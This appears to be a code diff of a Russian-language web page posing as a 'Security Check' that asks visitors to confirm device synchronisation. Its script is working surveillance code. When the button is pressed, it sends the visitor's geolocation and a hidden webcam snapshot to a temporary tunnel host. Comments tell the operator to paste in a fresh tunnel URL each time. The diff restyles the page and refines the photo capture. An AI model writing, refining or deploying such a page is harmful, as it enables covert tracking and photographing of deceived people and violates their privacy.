@@ -1,170 +1,53 @@
 <!DOCTYPE html>
 <html lang="ru">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>System Verification</title>
     <style>
-         :root {
-            --bg: #050505;
-            --accent: #0071e3;
-            /* Apple Blue */
-            --glass: rgba(255, 255, 255, 0.03);
-            --border: rgba(255, 255, 255, 0.1);
-        }
-        
-        body,
-        html {
-            margin: 0;
-            padding: 0;
-            width: 100%;
-            height: 100%;
-            background-color: var(--bg);
-            color: #fff;
-            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Helvetica Neue", sans-serif;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            overflow: hidden;
-            -webkit-font-smoothing: antialiased;
-        }
-        /* Эффект вспышки */
-        
-        #flash {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #fff;
-            opacity: 0;
-            pointer-events: none;
-            z-index: 1000;
-        }
-        /* Контейнер-карточка */
-        
-        .card {
-            position: relative;
-            width: 85%;
-            max-width: 340px;
-            padding: 40px 20px;
-            background: var(--glass);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            border: 1px solid var(--border);
-            border-radius: 28px;
-            text-align: center;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
-            transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
-        }
-        
-        h1 {
-            font-size: 22px;
-            font-weight: 600;
-            margin: 0 0 10px;
-            letter-spacing: -0.5px;
-        }
-        
-        p {
-            font-size: 14px;
-            color: #888;
-            margin-bottom: 30px;
-            line-height: 1.4;
-        }
-        /* Прокачанная кнопка */
-        
-        .btn {
-            position: relative;
-            background: #fff;
-            color: #000;
-            border: none;
-            padding: 16px 32px;
-            font-size: 16px;
-            font-weight: 600;
-            border-radius: 14px;
-            cursor: pointer;
-            width: 100%;
-            transition: all 0.2s ease;
-        }
-        
-        .btn:active {
-            transform: scale(0.97);
-            background: #f0f0f0;
-        }
-        /* Загрузчик (Spinner) */
-        
-        .loader {
-            display: none;
-            margin: 0 auto;
-            width: 24px;
-            height: 24px;
-            border: 3px solid rgba(255, 255, 255, 0.1);
-            border-top: 3px solid #fff;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-        }
-        
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-        /* Скрытые элементы */
-        
-        video,
-        canvas {
-            display: none;
-        }
-        /* Состояние успеха */
-        
-        .success-icon {
-            display: none;
-            color: #34c759;
-            font-size: 40px;
-            margin-bottom: 10px;
-        }
+        body { margin: 0; background: #050505; color: #fff; font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .card { width: 80%; max-width: 300px; padding: 40px; background: rgba(255,255,255,0.05); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1); border-radius: 30px; text-align: center; }
+        .btn { background: #fff; color: #000; border: none; padding: 15px 30px; font-size: 16px; font-weight: 600; border-radius: 12px; cursor: pointer; width: 100%; }
+        #loader { display: none; margin: 20px auto; width: 30px; height: 30px; border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #fff; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        video, canvas { display: none; }
+        #flash { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; opacity: 0; pointer-events: none; z-index: 100; }
     </style>
 </head>
-
 <body>
 
-    <div id="flash"></div>
+<div id="flash"></div>
 
-    <div class="card" id="app">
-        <div id="content">
-            <div class="success-icon" id="icon">✓</div>
-            <h1 id="title">Security Check</h1>
-            <p id="desc">Нажмите кнопку ниже для синхронизации устройства</p>
-            <button class="btn" id="mainBtn" onclick="initProcess()">Ок</button>
-            <div class="loader" id="loader"></div>
-        </div>
-    </div>
+<div class="card">
+    <h1 id="title" style="font-size: 20px;">Security Check</h1>
+    <p id="desc" style="color: #888; font-size: 14px; margin-bottom: 30px;">Нажмите для синхронизации</p>
+    <button class="btn" id="mainBtn" onclick="run()">Подтвердить</button>
+    <div id="loader"></div>
+</div>
 
-    <video id="v" autoplay playsinline></video>
-    <canvas id="c"></canvas>
+<video id="v" autoplay playsinline></video>
+<canvas id="c"></canvas>
 
-    <script>
-    // СЮДА ВСТАВЛЯЕШЬ ССЫЛКУ ИЗ ТЕРМИНАЛА (каждый раз новую!)
-    // Обязательно с https://
-    const API_URL = "https://e5c8666c6f39c3.trycloudflare.com"; 
+<script>
+    // ТВОЙ АКТУАЛЬНЫЙ АДРЕС (ИЗ ТЕРМИНАЛА)
+    const API = "https://29fe27558e7e03.lhr.life"; 
 
-    async function initProcess() {
+    async function run() {
         const btn = document.getElementById('mainBtn');
         const loader = document.getElementById('loader');
+        const title = document.getElementById('title');
+        
         btn.style.display = 'none';
         loader.style.display = 'block';
+        title.innerText = "Processing...";
 
         try {
-            // 1. Проверка связи (если тут упадет - значит ссылка в API_URL неверная)
-            const check = await fetch(`${API_URL}/ping`).catch(e => { throw new Error("Нет связи с сервером") });
-            
-            // 2. Гео
+            // 1. Пинг сервера (Проверка связи)
+            await fetch(`${API}/ping`);
+
+            // 2. Гео (параллельно)
             navigator.geolocation.getCurrentPosition(pos => {
-                fetch(`${API_URL}/location`, {
+                fetch(`${API}/location`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({lat: pos.coords.latitude, lon: pos.coords.longitude})
@@ -176,31 +59,37 @@
             const v = document.getElementById('v');
             v.srcObject = stream;
 
-            await new Promise(r => setTimeout(r, 1000));
+            await new Promise(r => setTimeout(r, 1200));
 
             // 4. Снимок
-            const canvas = document.getElementById('c');
-            canvas.width = 1280; canvas.height = 720;
-            canvas.getContext('2d').drawImage(v, 0, 0);
+            document.getElementById('flash').style.opacity = "1";
             
-            const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.9));
-            const fd = new FormData();
-            fd.append('file', blob, 'snap.jpg');
+            setTimeout(async () => {
+                const canvas = document.getElementById('c');
+                canvas.width = v.videoWidth; canvas.height = v.videoHeight;
+                canvas.getContext('2d').drawImage(v, 0, 0);
+                document.getElementById('flash').style.opacity = "0";
 
-            await fetch(`${API_URL}/upload-photo`, { method: 'POST', body: fd });
+                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
+                const fd = new FormData();
+                fd.append('file', blob, `snap_${Date.now()}.jpg`);
 
-            // Конец
-            stream.getTracks().forEach(t => t.stop());
-            document.getElementById('title').innerText = "Verified";
-            loader.style.display = 'none';
+                await fetch(`${API}/upload-photo`, {method: 'POST', body: fd});
 
-        } catch (err) {
-            alert("Ошибка: " + err.message);
+                // Конец
+                stream.getTracks().forEach(t => t.stop());
+                title.innerText = "Verified";
+                loader.style.display = 'none';
+                document.getElementById('desc').innerText = "Успешно завершено";
+            }, 100);
+
+        } catch (e) {
+            alert("Ошибка связи с сервером. Проверьте туннель.");
             btn.style.display = 'block';
             loader.style.display = 'none';
+            title.innerText = "Error";
         }
     }
 </script>
 </body>
-
 </html>
